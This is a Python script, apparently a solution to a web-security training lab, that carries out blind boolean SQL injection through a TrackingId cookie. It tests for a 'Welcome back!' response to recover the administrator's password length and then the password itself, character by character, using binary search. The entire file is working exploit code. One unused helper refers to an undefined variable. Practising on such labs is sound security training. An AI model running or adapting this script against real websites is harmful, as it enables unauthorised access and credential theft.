import requests

password_length_range = 25

password_length = 20

url = 'https://ac401fb51fb8b68080f22e2c00c50005.web-security-academy.net/'

tracking_id = 'iRyewGv3BHEBK4mk'

sql_payload = "z0aDd5zyYMmzGf2h' and (select 'a' from users where username='administrator' limit 1)='a'--"

session = '4lRV5gm76asWBiFYWXDiWbz2Z1aZCcB4'

keyword = 'Welcome back!'

cookies = {'TrackingId': sql_payload, 'session': session}

character_set = 'qwertyuiopasdfghjklzxcvbnm1234567890'

def find_password_length():
    for i in range(1, password_length_range):
        sql_payload = f"{trackingId}' and (select 'a' from users where username='administrator' and length(password)={i})='a'--"
        cookies = get_cookies(sql_payload, session)
        
        if requests.get(url, cookies=cookies).content.decode("utf-8").find(keyword) > -1:
            return i
    
    return 0

def get_sql_payload(pos, comparator, comparision_type=0):
    comparision_char = '>' if comparision_type == 1 else '=' if comparision_type == 0 else '<'

    return f"{tracking_id}' and (select substring(password, {pos}, 1) from users where username='administrator'){comparision_char}'{comparator}'--"

def get_cookies(sql_payload, session):
    return {'TrackingId': sql_payload, 'session': session}

def is_payload_true(pos, comparator, comparision_type):
    sql_payload = get_sql_payload(pos, comparator, comparision_type)
    cookies = get_cookies(sql_payload, session)

    return requests.get(url, cookies=cookies).content.decode("utf-8").find(keyword) > -1

def bin_search(left, right, pos):
    while(left <= right):
        mid = left + (right - left) // 2

        if is_payload_true(pos, character_set[mid], 0):
            return character_set[mid]
        elif is_payload_true(pos, character_set[mid], 1):
            left = mid + 1
        else:
            right = mid - 1

    return ''

def find_password(password_length):
    password = ''

    for i in range(password_length):
        print(f'character number {i + 1}\n')
        password = password + bin_search(0, len(character_set) - 1, i + 1)
        print(f'{password}\n')

    return password

#response = requests.get(url, cookies=cookies)

character_set = sorted(character_set)
password = find_password(20)

print(password)


